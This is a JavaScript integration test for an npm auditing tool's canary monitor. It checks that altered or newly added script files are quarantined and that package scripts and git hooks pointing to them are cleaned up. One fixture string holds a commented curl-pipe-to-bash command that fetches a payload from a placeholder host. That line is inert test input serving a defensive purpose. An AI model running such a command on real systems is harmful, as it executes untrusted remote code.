'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawn, spawnSync } = require('child_process');
const CLI = path.resolve(__dirname, '../../bin/npa.js');
const intentional = '// intentional canary test; never execute\n';
const changed = '// changed inert input; never execute\n// curl http://trust-monitor.invalid/payload | bash\n';
const hash = text => crypto.createHash('sha256').update(text).digest('hex');

module.exports = (async () => {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-trust-monitor-live-'));
  const observations = [];
  const active = [];
  const env = { ...process.env, HOME: parent, USERPROFILE: parent, NO_COLOR: '1',
    npm_config_offline: 'true', npm_config_ignore_scripts: 'true', npm_config_audit: 'false', npm_config_fund: 'false' };
  function fixture(name) {
    const root = path.join(parent, name);
    fs.mkdirSync(path.join(root, '.git/hooks'), { recursive: true });
    fs.mkdirSync(path.join(root, 'legit'));
    fs.writeFileSync(path.join(root, '.git/config'), '[core]\n');
    fs.writeFileSync(path.join(root, 'legit/canary.js'), intentional);
    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'npa-trust-monitor-live', version: '1.0.0', private: true,
      scripts: { build: 'node legit/canary.js && tsc', prepare: 'node legit/canary.js' } }));
    fs.writeFileSync(path.join(root, '.git/hooks/pre-commit'), '#!/bin/sh\nnode legit/canary.js\necho preserved\n');
    fs.writeFileSync(path.join(root, '.npmauditor.json'), JSON.stringify({ canaryProtection: true, silent: true,
      canaryTrustedFiles: [{ path: 'legit/canary.js', sha256: hash(intentional) }] }));
    return root;
  }
  function state(root) {
    const file = path.join(root, 'legit/canary.js');
    return { trustedFilePresent: fs.existsSync(file), trustedFileSha256: fs.existsSync(file) ? hash(fs.readFileSync(file)) : null,
      scripts: JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).scripts,
      hook: fs.readFileSync(path.join(root, '.git/hooks/pre-commit'), 'utf8'),
      ignore: fs.existsSync(path.join(root, '.gitignore')) ? fs.readFileSync(path.join(root, '.gitignore'), 'utf8') : null };
  }
  function monitor(root, readOnly = false) {
    const args = ['canary-monitor', root, '--json', '--interval', '5000', ...(readOnly ? ['--read-only'] : [])];
    const child = spawn(process.execPath, [CLI, ...args], { cwd: root, env, stdio: ['ignore', 'pipe', 'pipe'] });
    const records = [];
    let buffer = '';
    let bytes = 0;
    let stderr = '';
    let failure = null;
    let exited = false;
    let closed = false;
    const exit = new Promise(resolve => child.once('exit', (code, signal) => { exited = true; resolve({ code, signal }); }));
    child.on('error', err => { failure = err; });
    child.stderr.on('data', chunk => { stderr += chunk; });
    child.stdout.on('data', chunk => {
      bytes += chunk.length;
      if (bytes > 512 * 1024) { failure = new Error('Monitor output limit exceeded'); child.kill(); return; }
      buffer += chunk;
      let newline;
      while ((newline = buffer.indexOf('\n')) !== -1) {
        const line = buffer.slice(0, newline); buffer = buffer.slice(newline + 1);
        try { records.push(JSON.parse(line)); } catch (err) { failure = err; }
      }
    });
    const handle = {
      args, records,
      async wait(predicate) {
        const deadline = Date.now() + 4000;
        while (Date.now() < deadline) {
          if (failure) throw failure;
          if (exited) throw new Error('Monitor exited before expected observation: ' + stderr);
          const record = records.find(predicate);
          if (record) return record;
          await new Promise(resolve => setTimeout(resolve, 25));
        }
        throw new Error('Timed out waiting for real monitor event: ' + stderr);
      },
      async close() {
        if (closed) return;
        closed = true;
        if (!exited) child.kill();
        const result = await exit;
        observations.push({ kind: 'monitor-session', root, args, records, stderr, stopped: result });
      },
    };
    active.push(handle);
    return handle;
  }
  try {
    const root = fixture('native-trust');
    const before = state(root);
    let result = spawnSync(process.execPath, [CLI, 'prefix'], { cwd: root, env, encoding: 'utf8', timeout: 15000 });
    assert.ifError(result.error);
    assert.strictEqual(result.status, 0, result.stderr);
    assert.ok(result.stdout.trim().split(/\r?\n/).includes(root));
    assert.deepStrictEqual(state(root), before, 'Real protected npm launch must preserve the trusted file and calls');
    observations.push({ kind: 'trusted-native-launch', root, exit: result.status, stdout: result.stdout, stderr: result.stderr, before, after: state(root) });
    fs.writeFileSync(path.join(root, 'legit/canary.js'), changed);
    result = spawnSync(process.execPath, [CLI, 'prefix'], { cwd: root, env, encoding: 'utf8', timeout: 15000 });
    assert.strictEqual(result.status, 0, result.stderr);
    assert.strictEqual(state(root).trustedFilePresent, false);
    assert.deepStrictEqual(state(root).scripts, { build: 'tsc' });
    observations.push({ kind: 'changed-native-launch', root, exit: result.status, stdout: result.stdout, stderr: result.stderr, after: state(root) });

    const watched = fixture('automatic-monitor');
    const live = monitor(watched);
    const initial = await live.wait(record => record.event === 'scan' && record.report.trust.files.some(file => file.status === 'trusted'));
    assert.strictEqual(initial.report.monitor.mode, 'protect');
    assert.ok(initial.report.monitor.watchedRoots.includes(watched), 'This test requires actual watcher registration');
    const introduced = path.join(watched, 'incoming/canary.js');
    const start = Date.now();
    fs.mkdirSync(path.dirname(introduced));
    fs.writeFileSync(introduced, changed);
    const manifest = JSON.parse(fs.readFileSync(path.join(watched, 'package.json'), 'utf8'));
    manifest.scripts.build = 'node incoming/canary.js && tsc';
    fs.writeFileSync(path.join(watched, 'package.json'), JSON.stringify(manifest));
    fs.appendFileSync(path.join(watched, '.git/hooks/pre-commit'), 'node incoming/canary.js\n');
    const arrival = await live.wait(record => record.report?.quarantine?.actions.some(action => action.path === introduced && action.status === 'quarantined'));
    const elapsedMs = Date.now() - start;
    assert.ok(!fs.existsSync(introduced));
    assert.strictEqual(state(watched).trustedFileSha256, hash(intentional));
    assert.deepStrictEqual(state(watched).scripts, { build: 'tsc', prepare: 'node legit/canary.js' });
    assert.ok(state(watched).hook.includes('node legit/canary.js'));
    assert.ok(!state(watched).hook.includes('incoming/canary.js'));
    assert.ok(state(watched).ignore.includes('!/legit/canary.js'));
    const action = arrival.report.quarantine.actions.find(action => action.path === introduced);
    assert.strictEqual(fs.readFileSync(action.target, 'utf8'), changed);
    observations.push({ kind: 'real-arrival', path: introduced, elapsedMs, intervalMs: 5000, status: action.status, after: state(watched) });

    const approved = path.join(watched, 'legit/canary.js');
    fs.writeFileSync(approved, changed);
    const revoked = await live.wait(record => record.report?.quarantine?.actions.some(action => action.path === approved && action.status === 'quarantined'));
    assert.ok(revoked.report.trust.before.some(file => file.path === approved && file.status === 'changed'));
    assert.strictEqual(state(watched).trustedFilePresent, false);
    assert.deepStrictEqual(state(watched).scripts, { build: 'tsc' });
    observations.push({ kind: 'changed-monitored-trust', after: state(watched) });
    await live.close();

    const readonly = fixture('read-only-monitor');
    const alert = monitor(readonly, true);
    await alert.wait(record => record.event === 'scan');
    const readonlyBefore = state(readonly);
    const residue = path.join(readonly, 'canary.js');
    fs.writeFileSync(residue, changed);
    await alert.wait(record => record.report?.findings.some(finding => finding.path === residue && finding.name === 'canary-indicator'));
    assert.strictEqual(fs.readFileSync(residue, 'utf8'), changed);
    assert.deepStrictEqual(state(readonly), readonlyBefore);
    observations.push({ kind: 'read-only-arrival', path: residue, present: true, inputsUnchanged: true });
    await alert.close();
    console.log('  live trusted canaries and monitor: real npm preserves exact pins, changed pins quarantine, real arrivals automatically quarantine, read-only arrivals preserve inputs (no scanned scripts executed)');
    return observations;
  } finally {
    for (const handle of active) await handle.close();
    fs.rmSync(parent, { recursive: true, force: true });
  }
})();
